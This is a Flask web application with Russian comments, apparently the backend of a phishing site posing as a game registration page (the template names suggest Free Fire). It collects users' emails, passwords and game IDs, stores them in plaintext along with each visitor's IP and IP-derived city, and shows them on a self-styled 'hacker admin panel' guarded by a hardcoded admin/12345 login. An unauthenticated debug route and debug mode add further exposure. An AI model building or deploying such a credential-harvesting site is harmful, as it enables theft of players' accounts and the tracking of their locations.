from flask import Flask, request, render_template, redirect, url_for, jsonify
import json, datetime, os, requests
from functools import wraps

app = Flask(__name__)

# 🔹 Файл для сохранения пользователей
USERS_FILE = "TaFo.json"


# 🔹 Проверка города по IP
def get_location(ip):
    try:
        response = requests.get(f"http://ipinfo.io/{ip}/json")
        if response.status_code == 200:
            data = response.json()
            return data.get("city", "Неизвестно")
    except:
        return "Неизвестно"
    return "Неизвестно"


# 🔹 Загрузка пользователей из файла
def load_users():
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump([], f)
        return []

    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return []


# 🔹 Сохранение пользователей в файл
def save_users(users):
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, ensure_ascii=False, indent=2)


# 🔹 Найти пользователя по UID
def find_user_by_uid(uid):
    users = load_users()
    for user in users:
        if user.get("uid") == uid:
            return user
    return None


# 🔹 Сохранить нового пользователя
def save_new_user(email, password, uid, ip):
    users = load_users()

    # Проверяем, что UID не занят
    for user in users:
        if user.get("uid") == uid:
            return False

    user_data = {
        "email": email,
        "password": password,
        "uid": uid,
        "ip": ip,
        "city": get_location(ip),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "coins": 0,
        "diamonds": 0
    }

    users.append(user_data)
    save_users(users)
    return True


# 🔹 Авторизация в админку
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not (auth.username == "admin" and auth.password == "12345"):
            return ("⚠️ Доступ запрещён", 401, {"WWW-Authenticate": 'Basic realm="Login Required"'})
        return f(*args, **kwargs)

    return decorated


# 🔹 Главная страница - форма регистрации
@app.route("/")
def home():
    return render_template("FF.html")


# 🔹 Обработка регистрации
@app.route("/register", methods=["POST"])
def register():
    email = request.form.get("email")
    password = request.form.get("password")
    uid = request.form.get("uid")
    ip = request.remote_addr

    if not email or not password or not uid:
        return redirect("/?error=fields")

    # Ограничение по UID
    if not uid.isdigit() or not (9 <= len(uid) <= 13):
        return redirect("/?error=uid")

    try:
        if save_new_user(email, password, uid, ip):
            return redirect(f"/game?uid={uid}")
        else:
            return redirect("/?error=uid_exists")
    except Exception as e:
        return redirect("/?error=server")


# 🔹 Обработка входа
@app.route("/login", methods=["POST"])
def login():
    uid = request.form.get("uid")
    password = request.form.get("password")

    if not uid or not password:
        return redirect("/?error=login_fields")

    # Поиск пользователя
    user = find_user_by_uid(uid)
    if not user:
        return redirect("/?error=user_not_found")

    # Проверка пароля
    if user.get("password") != password:
        return redirect("/?error=wrong_password")

    # Успешный вход
    return redirect(f"/game?uid={uid}")


# 🔹 Игровая страница
@app.route("/game")
def game():
    uid = request.args.get("uid")
    if not uid:
        return redirect("/")

    user = find_user_by_uid(uid)
    if not user:
        return redirect("/?error=user_not_found")

    return render_template("FF2.html", user=user)


# 🔹 Обновление прогресса игрока
@app.route("/update", methods=["POST"])
def update_progress():
    try:
        data = request.get_json()
        uid = data.get("uid")
        coins = data.get("coins", 0)
        diamonds = data.get("diamonds", 0)

        if not uid:
            return jsonify({"success": False, "error": "UID not provided"})

        users = load_users()
        user_found = False

        for user in users:
            if user.get("uid") == uid:
                user["coins"] = coins
                user["diamonds"] = diamonds
                user["last_update"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                user_found = True
                break

        if user_found:
            save_users(users)
            return jsonify({"success": True})
        else:
            return jsonify({"success": False, "error": "User not found"})

    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


# 🔹 Админ-панель
@app.route("/admin")
@admin_required
def admin():
    users = load_users()

    table_rows = ""
    for u in users[::-1]:  # Показываем последних пользователей первыми
        table_rows += f"""
        <tr>
            <td>{u.get('email', 'N/A')}</td>
            <td>{u.get('password', 'N/A')}</td>
            <td>{u.get('uid', 'N/A')}</td>
            <td>{u.get('ip', 'N/A')}</td>
            <td>{u.get('city', 'N/A')}</td>
            <td>{u.get('time', 'N/A')}</td>
            <td>{u.get('coins', 0)}</td>
            <td>{u.get('diamonds', 0)}</td>
        </tr>
        """

    # HTML шаблон админки
    admin_html = f"""
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta http-equiv="refresh" content="10">
      <title>💀 Админка 💀</title>
      <style>
        body {{ 
            background: #000; 
            color: #00ff00; 
            font-family: 'Courier New', monospace; 
            margin: 0;
            padding: 20px;
        }}
        h1 {{ 
            color: #ff0000; 
            text-align: center;
            text-shadow: 0 0 10px #ff0000;
        }}
        table {{ 
            width: 100%; 
            border-collapse: collapse; 
            margin: 20px 0;
            background: rgba(0, 20, 0, 0.8);
        }}
        td, th {{ 
            border: 1px solid #00ff00; 
            padding: 8px; 
            text-align: left;
            word-break: break-all;
        }}
        th {{
            background: rgba(0, 100, 0, 0.3);
            color: #00ffff;
        }}
        tr:nth-child(even) {{
            background: rgba(0, 50, 0, 0.2);
        }}
        .stats {{
            text-align: center;
            margin: 20px 0;
            font-size: 18px;
        }}
        .footer {{
            color: #888;
            text-align: center;
            margin-top: 30px;
            font-size: 12px;
        }}
      </style>
    </head>
    <body>
      <h1>💀 ХАКЕРСКАЯ АДМИНКА 💀</h1>

      <div class="stats">
        📊 Всего зарегистрированных пользователей: <strong>{len(users)}</strong>
      </div>

      <table>
        <tr>
          <th>📧 Email</th>
          <th>🔐 Password</th>
          <th>🆔 UID</th>
          <th>🌐 IP</th>
          <th>🏙️ Город</th>
          <th>⏰ Время</th>
          <th>🪙 Монеты</th>
          <th>💎 Алмазы</th>
        </tr>
        {table_rows}
      </table>

      <div class="footer">
        <p>🕶️ Хакерская заметка: система мониторинга активна...</p>
        <p>⚡ Автообновление каждые 10 секунд</p>
      </div>
    </body>
    </html>
    """

    return admin_html


# 🔹 Отладочный роут
@app.route("/debug")
def debug():
    users = load_users()
    file_exists = os.path.exists(USERS_FILE)

    return f"""
    <h1>🔍 Отладочная информация</h1>
    <p><strong>Файл {USERS_FILE} существует:</strong> {file_exists}</p>
    <p><strong>Количество пользователей:</strong> {len(users)}</p>
    <p><strong>Текущий путь:</strong> {os.getcwd()}</p>
    <p><strong>Полный путь к файлу:</strong> {os.path.abspath(USERS_FILE)}</p>
    <hr>
    <a href="/admin">Перейти в админку</a> | 
    <a href="/">Главная</a>
    """


if __name__ == "__main__":
    print("🚀 Запуск Flask приложения...")
    print("📊 Админка доступна по адресу: http://localhost:5000/admin")
    print("🎮 Игровая страница: http://localhost:5000/game")
    print("🔍 Отладка: http://localhost:5000/debug")
    print("🔐 Логин админки: admin | Пароль: 12345")

   # Создаем файл TaFo.json если его нет
if not os.path.exists(USERS_FILE):
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump([], f)
    print(f"📁 Создан файл {USERS_FILE}")
else:
    print(f"📁 Файл {USERS_FILE} уже существует")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # Render даст свой порт
    app.run(debug=True, host='0.0.0.0', port=port)

